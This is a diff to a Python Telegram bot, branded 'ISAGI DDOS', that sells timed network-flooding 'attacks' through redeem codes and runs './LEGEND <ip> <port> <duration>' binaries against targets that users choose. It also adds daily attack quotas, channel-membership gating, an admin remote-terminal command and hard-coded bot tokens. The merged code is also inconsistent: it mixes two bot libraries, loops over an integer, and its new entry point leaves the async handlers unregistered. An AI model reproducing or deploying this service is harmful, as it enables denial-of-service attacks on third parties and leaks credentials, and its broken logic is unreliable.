@@ -2,6 +2,9 @@ import os
 import socket
 import subprocess
 import asyncio
+import telebot
+import logging
+
 import pytz
 import platform
 import random
@@ -21,8 +24,10 @@ redeem_codes_collection = db['redeem_codes']
 attack_logs_collection = db['user_attack_logs']
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '8133767092:AAGXXhLvad9X9PvJb1vMUhxvXWGOUMvGNoY'
+TELEGRAM_BOT_TOKEN = '7976200794:AAHPhjZEQrZyoysM3GA7DsX8bJhULIVI2e0'
+TOKEN = '7976200794:AAHPhjZEQrZyoysM3GA7DsX8bJhULIVI2e0'
 ADMIN_USER_ID = 6353114118 
+ADMIN_IDS = 6353114118
 ADMIN_USER_ID = 6353114118 
 COOLDOWN_PERIOD = timedelta(minutes=1) 
 user_last_attack_time = {} 
@@ -30,6 +35,39 @@ user_attack_history = {}
 cooldown_dict = {}
 active_processes = {}
 current_directory = os.getcwd()
+# Initialize the bot
+bot = telebot.TeleBot(TOKEN)
+
+# Dictionary to track user attack counts, cooldowns, photo feedbacks, and bans
+user_attacks = {}
+allowed_user_ids = {}
+user_cooldowns = {}
+user_photos = {}  # Tracks whether a user has sent a photo as feedback
+user_bans = {}  # Tracks user ban status and ban expiry time
+reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=10))).replace(hour=0, minute=0, second=0, microsecond=0)
+
+# Cooldown duration (in seconds)
+COOLDOWN_DURATION = 3  # 5 minutes
+BAN_DURATION = timedelta(minutes=1)  
+DAILY_ATTACK_LIMIT = 15  # Daily attack limit per user
+
+# List of user IDs exempted from cooldown, limits, and photo requirements
+EXEMPTED_USERS = [6353114118, 6353114118]
+
+# Track active attacks
+active_attacks = 0  
+MAX_ACTIVE_ATTACKS = 1  # Maximum number of running attacks
+
+def reset_daily_counts():
+    """Reset the daily attack counts and other data at 12 AM IST."""
+    global reset_time
+    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=10)))
+    if ist_now >= reset_time + timedelta(days=1):
+        user_attacks.clear()
+        user_cooldowns.clear()
+        user_photos.clear()
+        user_bans.clear()
+        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
 
 # Default values (in case not set by the admin)
 DEFAULT_BYTE_SIZE = 900
@@ -39,7 +77,7 @@ valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.')
 
 # Adjust this to your local timezone, e.g., 'America/New_York' or 'Asia/Kolkata'
 LOCAL_TIMEZONE = pytz.timezone("Asia/Kolkata")
-PROTECTED_FILES = ["LEGEND.py", "LEGEND"]
+PROTECTED_FILES = ["e.py", "ISAGI"]
 BLOCKED_COMMANDS = ['nano', 'vim', 'shutdown', 'reboot', 'rm', 'mv', 'dd']
 
 # Fetch the current user and hostname dynamically
@@ -175,6 +213,25 @@ async def execute_terminal(update: Update, context: CallbackContext):
             parse_mode='Markdown'
         )
 
+
+async def check_status(message):
+    user_id = message.from_user.id
+    remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
+    cooldown_end = user_cooldowns.get(user_id)
+    cooldown_time = max(0, (cooldown_end - datetime.now()).seconds) if cooldown_end else 0
+    minutes, seconds = divmod(cooldown_time, 60)  # Convert to minutes and seconds
+
+    response = (
+        "🛡️✨ *『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 』* ✨🛡️\n\n"
+        f"👤 *𝙐𝙨𝙚𝙧:* {message.from_user.first_name}\n"
+        f"🎯 *𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝘼𝙩𝙩𝙖𝙘𝙠𝙨:* `{remaining_attacks}` ⚔️\n"
+        f"⏳ *𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙏𝙞𝙢𝙚:* `{minutes} min {seconds} sec` 🕒\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "🚀 *𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 𝘼𝙉𝘿 𝙒𝙄𝙉 𝙏𝙃𝙀 𝘽𝘼𝙏𝙏𝙇𝙀!* ⚡"
+    )
+    bot.reply_to(message, response, parse_mode="Markdown")
+
+
 # Add to handle uploads when replying to a file
 async def upload(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
@@ -308,36 +365,49 @@ async def help_command(update: Update, context: CallbackContext):
     if user_id != ADMIN_USER_ID:
         # Help text for regular users (exclude sensitive commands)
         help_text = (
-            "*Here are the commands you can use:* \n\n"
-            "*🔸 /start* - Start interacting with the bot.\n"
-            "*🔸 /attack* - Trigger an attack operation.\n"
-            "*🔸 /redeem* - Redeem a code.\n"
+        "╔══════════════════════════╗\n"
+        " 🌟 *『 𝐇𝐄𝐋𝐏 𝐌𝐄𝐍𝐔 』* 🌟\n"
+        "╚══════════════════════════╝\n\n"
+        "💀 *𝙏𝙃𝙀 𝘽𝙀𝙎𝙏 𝘽𝙊𝙏 𝙁𝙊𝙍 𝘿𝙊𝙈𝙄𝙉𝘼𝙏𝙄𝙊𝙉!* 💀\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "🚀 *『 𝗨𝗦𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 』* 🚀\n"
+        "🎮 /start - ✨ *Begin your journey!*\n"
+        "📜 /help - 🏆 *View this epic menu!*\n"
+        "💀 /attack - 🎯 *Launch your attack!* *(Verified users only)*\n"
+        "⚡ /status - 🚀 *Check your battle status!*\n"
+        "📸 *Send a Photo* - 🔥 *Submit feedback!* 🔥 \n\n"
         )
     else:
-        # Help text for admins (include sensitive commands)
+        # Help text for admins (incl  ude sensitive commands)
         help_text = (
-            "*💡 Available Commands for Admins:*\n\n"
-            "*🔸 /start* - Start the bot.\n"
-            "*🔸 /attack* - Start the attack.\n"
-            "*🔸 /add [user_id]* - Add a user.\n"
-            "*🔸 /remove [user_id]* - Remove a user.\n"
-            "*🔸 /thread [number]* - Set number of threads.\n"
-            "*🔸 /byte [size]* - Set the byte size.\n"
-            "*🔸 /show* - Show current settings.\n"
-            "*🔸 /users* - List all allowed users.\n"
-            "*🔸 /gen* - Generate a redeem code.\n"
-            "*🔸 /redeem* - Redeem a code.\n"
-            "*🔸 /cleanup* - Clean up stored data.\n"
-            "*🔸 /argument [type]* - Set the (3, 4, or 5).\n"
-            "*🔸 /delete_code* - Delete a redeem code.\n"
-            "*🔸 /list_codes* - List all redeem codes.\n"
-            "*🔸 /set_time* - Set max attack time.\n"
-            "*🔸 /log [user_id]* - View attack history.\n"
-            "*🔸 /delete_log [user_id]* - Delete history.\n"
-            "*🔸 /upload* - Upload a file.\n"
-            "*🔸 /ls* - List files in the directory.\n"
-            "*🔸 /delete [filename]* - Delete a file.\n"
-            "*🔸 /terminal [command]* - Execute.\n"
+        "╔══════════════════════════╗\n"
+        "      🌟*『 ADMIN 𝐇𝐄𝐋𝐏 𝐌𝐄𝐍𝐔 』* 🌟\n"
+        "╚══════════════════════════╝\n\n"
+        "💀 *𝙏𝙃𝙀 𝘽𝙀𝙎𝙏 𝘽𝙊𝙏 𝙁𝙊𝙍 𝘿𝙊𝙈𝙄𝙉𝘼𝙏𝙄𝙊𝙉!* 💀\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "🚀 *『 ADMIN 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 』* 🚀\n"
+        "*🔥 /start* - Start the bot.\n"
+        "*💥 /attack* - Start the attack.\n"
+        "*😎 /add [user_id]* - Add a user.\n"
+        "*💀 /remove [user_id]* - Remove a user.\n"
+        "*🔥 /thread [number]* - Set number of threads.\n"
+        "*💀 /byte [size]* - Set the byte size.\n"
+        "*💥 /show* - Show current settings.\n"
+        "*☠️ /users* - List all allowed users.\n"
+        "*💥 /gen* - Generate a redeem code.\n"
+        "*💀 /redeem* - Redeem a code.\n"
+        "*👽 /cleanup* - Clean up stored data.\n"
+        "*😊 /argument [type]* - Set the (3, 4, or 5).\n"
+        "*🔴 /delete_code* - Delete a redeem code.\n"
+        "*🥵 /list_codes* - List all redeem codes.\n"
+        "*🥶 /set_time* - Set max attack time.\n"
+        "*😎 /log [user_id]* - View attack history.\n"
+        "*⚽ /delete_log [user_id]* - Delete history.\n"
+        "*✨ /upload* - Upload a file.\n"
+        "*🥶 /ls* - List files in the directory.\n"
+        "*❤ /delete [filename]* - Delete a file.\n"
+        "*😁 /terminal [command]* - Execute.\n"
+        
         )
     await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')
 
@@ -351,11 +421,105 @@ async def start(update: Update, context: CallbackContext):
         return
 
     message = (
-        "*🔥 Welcome to the battlefield! 🔥*\n\n"
-        "*Use /attack <ip> <port> <duration>*\n"
-        "*Let the war begin! ⚔️💥*"
+        "✨🔥 *『 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 ISAGI DDOS™ 』* 🔥✨\n\n"
+        "🚀 *Hello, Player!* ⚡\n"
+        "🎯 *Get ready to dominate the battlefield!* 🏆\n\n"
+        "💀 *𝙏𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙨 𝙙𝙚𝙨𝙞𝙜𝙣𝙚𝙙 𝙩𝙤 𝙝𝙚𝙡𝙥 𝙮𝙤𝙪 𝙖𝙩𝙩𝙖𝙘𝙠 & 𝙙𝙚𝙛𝙚𝙣𝙙!* 💀\n\n"
+        "⚡ *Use* /help *to explore all commands!* 📜"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+
+# Handler for photos (feedback)
+FEEDBACK_CHANNEL_ID = "-1002364415379"
+last_feedback_photo = {}
+user_photos = {}
+
+@bot.message_handler(content_types=['photo'])
+def handle_photo(message):
+    user_id = message.from_user.id
+    username = message.from_user.username or message.from_user.first_name
+    photo_id = message.photo[-1].file_id
+
+    if last_feedback_photo.get(user_id) == photo_id:
+        response = (
+            "⚠️🚨 *『 𝗪𝗔𝗥𝗡𝗜𝗡𝗚: SAME 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞! 』* 🚨⚠️\n\n"
+            "🛑 *𝖸𝖮𝖴 𝖧𝖠𝖵𝖤 𝖲𝖤𝖭𝖳 𝖳𝖧𝖨𝖲 𝖥𝖤𝖤𝖣𝖡𝖠𝖢𝖪 𝘽𝙀𝙁𝙊𝙍𝙀!* 🛑\n"
+            "📩 *𝙋𝙇𝙀𝘼𝙎𝙀 𝘼𝙑𝙊𝙄𝘿 𝙍𝙀𝙎𝙀𝙉𝘿𝙄𝙉𝙂 𝙏𝙃𝙀 𝙎𝘼𝙈𝙀 𝙋𝙃𝙊𝙏𝙊.*\n\n"
+            "✅ *𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙒𝙄𝙇𝙇 𝙎𝙏𝙄𝙇𝙇 𝘽𝙀 𝙎𝙀𝙉𝙏!*"
+        )
+        bot.reply_to(message, response)
+
+    last_feedback_photo[user_id] = photo_id
+    user_photos[user_id] = True
+
+    response = (
+        "✨『 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳𝑳𝒀 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』✨\n"
+        "━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🏆\n"
+        "📩 𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!🎉\n"
+        "━━━━━━━━━━━━━━━━━━━"
+    )
+    bot.reply_to(message, response)
+
+    for admin_id in ADMIN_IDS:
+        bot.forward_message(admin_id, message.chat.id, message.message_id)
+        admin_response = (
+            "🚀🔥 *『 𝑵𝑬𝑾 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』* 🔥🚀\n"
+            "━━━━━━━━━━━━━━━━━━━\n"
+            f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🛡️\n"
+            f"🆔 *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
+            "📸 *𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!!* ⬇️\n"
+            "━━━━━━━━━━━━━━━━━━━"
+        )
+        bot.send_message(admin_id, admin_response)
+
+    bot.forward_message(FEEDBACK_CHANNEL_ID, message.chat.id, message.message_id)
+    channel_response = (
+        "🌟🎖️ *『 𝑵𝑬𝑾 𝑷𝑼𝑩𝑳𝑰𝑪 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲! 』* 🎖️🌟\n"
+        "━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🏆\n"
+        f"🆔 *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
+        "📸 *𝙐𝙎𝙀𝙍 𝙃𝘼𝙎 𝙎𝙃𝘼𝙍𝙀𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆.!* 🖼️\n"
+        "━━━━━━━━━━━━━━━━━━━\n"
+        "📢 *𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 & 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!* 💖"
+    )
+    bot.send_message(FEEDBACK_CHANNEL_ID, channel_response)
+
+
+# Verification
+verified_users = set()
+PRIVATE_CHANNEL_USERNAME = "ISAGIxCRACKS"
+PRIVATE_CHANNEL_LINK = "https://t.me/ISAGIxCRACKS"
+
+@bot.message_handler(commands=['verify'])
+def verify_user(message):
+    user_id = message.from_user.id
+    
+    try:
+        chat_member = bot.get_chat_member(f"@{PRIVATE_CHANNEL_USERNAME}", user_id)
+        if chat_member.status in ["member", "administrator", "creator"]:
+            verified_users.add(user_id)
+            bot.send_message(
+                message.chat.id,
+                "✅✨ *𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟!* ✨✅\n\n"
+                "🎉 𝗪𝗲𝗹𝗰𝗼𝗺𝗲! 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘄 𝗮 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 𝗨𝘀𝗲𝗿. 🚀\n"
+                "🔗 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝗮𝗰𝗰𝗲𝘀𝘀 /bgmi 𝘀𝗲𝗿𝘃𝗶𝗰𝗲𝘀! ⚡"
+            )
+        else:
+            bot.send_message(
+                message.chat.id,
+                f"🚨 *𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 𝗙𝗔𝗜𝗟𝗘𝗗!* 🚨\n\n"
+                f"🔗 [Join our Channel]({PRIVATE_CHANNEL_LINK}) 📩\n"
+                "⚠️ 𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴, 𝗿𝘂𝗻 /verify 𝗮𝗴𝗮𝗶𝗻.",
+                parse_mode="Markdown"
+            )
+    except Exception:
+        bot.send_message(
+            message.chat.id,
+            f"⚠️ *𝗘𝗿𝗿𝗼𝗿 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗠𝗲𝗺𝗯𝗲𝗿𝘀𝗵𝗶𝗽!* ⚠️\n\n"
+            f"📌 𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗵𝗮𝘃𝗲 𝗷𝗼𝗶𝗻𝗲𝗱: [Click Here]({PRIVATE_CHANNEL_LINK})",
+            parse_mode="Markdown"
+        )
 
 async def add_user(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
@@ -672,9 +836,9 @@ async def attack(update: Update, context: CallbackContext):
 
     # Determine the attack command based on the argument type
     if argument_type == 3:
-        attack_command = f"./LEGEND3 {ip} {port} {duration}"
+        attack_command = f"./LEGEND {ip} {port} {duration}"
     elif argument_type == 4:
-        attack_command = f"./LEGEND4 {ip} {port} {duration} {threads}"
+        attack_command = f"./LEGEND {ip} {port} {duration} {threads}"
     elif argument_type == 5:
         attack_command = f"./LEGEND {ip} {port} {duration} {byte_size} {threads}"
 
@@ -780,16 +944,19 @@ async def generate_redeem_code(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     if user_id != ADMIN_USER_ID:
         await context.bot.send_message(
-            chat_id=update.effective_chat.id, 
-            text="*❌ You are not authorized to generate redeem codes!*", 
+            chat_id=update.effective_chat.id,
+            text="*❌ You are not authorized to generate redeem codes!*",
             parse_mode='Markdown'
         )
         return
 
     if len(context.args) < 1:
         await context.bot.send_message(
-            chat_id=update.effective_chat.id, 
-            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
+            chat_id=update.effective_chat.id,
+            text=(
+                "*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*\n"
+                "example: /gen paiduser 1d 1"
+            ),
             parse_mode='Markdown'
         )
         return
@@ -806,62 +973,80 @@ async def generate_redeem_code(update: Update, context: CallbackContext):
     else:
         # First argument is custom code
         custom_code = time_input
-        time_input = context.args[1] if len(context.args) > 1 else None
+        if len(context.args) < 2:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="*⚠️ Please provide a duration (e.g., 1d or 30m) after the custom code.*",
+                parse_mode='Markdown'
+            )
+            return
+        time_input = context.args[1]
         redeem_code = custom_code
 
     # Check if a time value was provided
     if time_input is None or time_input[-1].lower() not in ['d', 'm']:
         await context.bot.send_message(
-            chat_id=update.effective_chat.id, 
-            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
+            chat_id=update.effective_chat.id,
+            text="*⚠️ Please specify time in days (d) or minutes (m).*",
             parse_mode='Markdown'
         )
         return
 
     # Calculate expiration time
-    if time_input[-1].lower() == 'd':  # Days
-        time_value = int(time_input[:-1])
-        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
-        expiry_label = f"{time_value} day(s)"
-    elif time_input[-1].lower() == 'm':  # Minutes
-        time_value = int(time_input[:-1])
-        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
-        expiry_label = f"{time_value} minute(s)"
+    try:
+        if time_input[-1].lower() == 'd':  # Days
+            time_value = int(time_input[:-1])
+            expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
+            expiry_label = f"{time_value} day(s)"
+        elif time_input[-1].lower() == 'm':  # Minutes
+            time_value = int(time_input[:-1])
+            expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
+            expiry_label = f"{time_value} minute(s)"
+    except ValueError:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="*⚠️ Invalid time format. Use like `1d` or `30m`.*",
+            parse_mode='Markdown'
+        )
+        return
 
     # Set max_uses if provided
-    if len(context.args) > (2 if custom_code else 1):
-        try:
-            max_uses = int(context.args[2] if custom_code else context.args[1])
-        except ValueError:
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id, 
-                text="*⚠️ Please provide a valid number for max uses.*", 
-                parse_mode='Markdown'
-            )
-            return
+    try:
+        if custom_code:
+            if len(context.args) > 2:
+                max_uses = int(context.args[2])
+        else:
+            if len(context.args) > 1:
+                max_uses = int(context.args[1])
+    except ValueError:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="*⚠️ Please provide a valid number for max uses.*",
+            parse_mode='Markdown'
+        )
+        return
 
-    # Insert the redeem code with expiration and usage limits
+    # Insert the redeem code into your database
     redeem_codes_collection.insert_one({
         "code": redeem_code,
         "expiry_date": expiry_date,
-        "used_by": [],  # Track user IDs that redeem the code
+        "used_by": [],
         "max_uses": max_uses,
         "redeem_count": 0
     })
 
-    # Format the message
+    # Send success message
     message = (
         f"✅ Redeem code generated: `{redeem_code}`\n"
         f"Expires in {expiry_label}\n"
         f"Max uses: {max_uses}"
     )
-    
-    # Send the message with the code in monospace
     await context.bot.send_message(
-        chat_id=update.effective_chat.id, 
-        text=message, 
+        chat_id=update.effective_chat.id,
+        text=message,
         parse_mode='Markdown'
     )
+
 
 # Function to redeem a code with a limited number of uses
 async def redeem_code(update: Update, context: CallbackContext):
@@ -1073,9 +1258,15 @@ def main():
     application.add_handler(CommandHandler("ls", list_files))
     application.add_handler(CommandHandler("delete", delete_file))
     application.add_handler(CommandHandler("terminal", execute_terminal))
+    application.add_handler(CommandHandler("status", check_status))
 
     application.run_polling()
 
-if __name__ == '__main__':
-    main()
+# Start the bot
+if __name__ == "__main__":
+    logging.info("Bot is starting...")
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        logging.error(f"An error occurred: {e}")
 
